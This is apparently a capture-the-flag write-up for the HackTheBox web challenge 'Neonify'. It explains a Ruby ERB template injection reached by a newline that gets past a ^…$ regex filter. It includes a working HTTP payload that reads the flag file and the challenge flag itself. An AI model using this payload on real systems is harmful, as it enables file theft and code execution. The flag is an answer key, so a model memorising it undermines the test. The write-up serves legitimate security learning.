---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [ERB, SSTI, evasion, regex, ruby]
---
>[!quote]
> *It's time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!*


# Set up

- **Dockerfile**
    
    ```bash
    FROM ruby:2.7.5-alpine3.15
    
    # Install supervisor
    RUN apk add --update --no-cache supervisor
    
    # Setup user
    RUN adduser -D -u 1000 -g 1000 -s /bin/sh www
    
    # Copy challenge files
    RUN mkdir /app
    COPY challenge/ /app
    COPY config/supervisord.conf /etc/supervisord.conf
    
    # Install dependencies
    WORKDIR /app
    RUN bundle install
    RUN gem install shotgun
    
    # Expose the app port
    EXPOSE 1337
    
    # Start supervisord
    ENTRYPOINT ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
    ```
    
- **builder-docker.sh**
    
    ```bash
    docker build -t web_neonify .
    docker run  --name=web_neonify --rm -p1337:1337 -it web_neonify
    ```
    

# Information Gathering

## Screenshots

![Untitled](../../zzz_res/attachments/Neonify%20037ad3b44afe4e60899226c37de2c396.png)

```
POST / HTTP/1.1
Host: 167.71.139.192:30707
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://167.71.139.192:30707
Connection: close
Referer: http://167.71.139.192:30707/
Upgrade-Insecure-Requests: 1

neon=test
```

![Untitled](../../zzz_res/attachments/Neonify%20037ad3b44afe4e60899226c37de2c396%201.png)

## Source code

- **config.ru**
    
    ```ruby
    require_relative './config/environment'
    run NeonControllers
    ```
    
- **environment.rb**
    
    ```ruby
    require 'bundler/setup'
    
    APP_ENV = ENV["RACK_ENV"] || "development"
    
    Bundler.require :default, APP_ENV.to_sym
    
    require 'rubygems'
    require 'bundler'
    
    require_rel '../app'
    ```
    
- **index.erb**
    
    ```ruby
    <!DOCTYPE html>
    <html>
    <head>
        <title>Neonify</title>
        <link rel="stylesheet" href="stylesheets/style.css">
        <link rel="icon" type="image/gif" href="/images/gem.gif">
    </head>
    <body>
        <div class="wrapper">
            <h1 class="title">Amazing Neonify Generator</h1>
            <form action="/" method="post">
                <p>Enter Text to Neonify</p><br>
                <input type="text" name="neon" value="">
                <input type="submit" value="Submit">
            </form>
            <h1 class="glow"><%= @neon %></h1>
        </div>
    </body>
    </html>
    ```
    
- **neon.rb**
    
    ```ruby
    class NeonControllers < Sinatra::Base
    
      configure do
        set :views, "app/views"
        set :public_dir, "public"
      end
    
      get '/' do
        @neon = "Glow With The Flow"
        erb :'index'
      end
    
      post '/' do
        if params[:neon] =~ /^[0-9a-z ]+$/i
          @neon = ERB.new(params[:neon]).result(binding)
        else
          @neon = "Malicious Input Detected"
        end
        erb :'index'
      end
    
    end
    ```
    

# The Bug

- The application is vulnerable to SSTI because user controlled input is reflected within templates.
- The regex is misconfigured and can be bypassed using a multi-line input containing new-lines.
    
    [Difference between \A \z and ^ $ in Ruby regular expressions](https://stackoverflow.com/questions/577653/difference-between-a-z-and-in-ruby-regular-expressions)

>[!warning]
> If you're depending on the regular expression for validation, you always want to use `\A` and `\z`. `^` and `$` will only match up **until a newline character**, which means they could use an email like `me@example.com\n<script>dangerous_stuff();</script>` and still have it validate, since the regex only sees everything before the `\n`.


# Exploitation

![Untitled](../../zzz_res/attachments/Neonify%20037ad3b44afe4e60899226c37de2c396%202.png)

```
POST / HTTP/1.1
Host: 167.71.139.192:30707
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://167.71.139.192:30707
Connection: close
Referer: http://167.71.139.192:30707/
Upgrade-Insecure-Requests: 1

neon=<%25%3d+File.open('/app/flag.txt').read+%25>
7
```

![Untitled](../../zzz_res/attachments/Neonify%20037ad3b44afe4e60899226c37de2c396%203.png)

# Flag

>[!success]
>`HTB{r3pl4c3m3n7_s3cur1ty}`

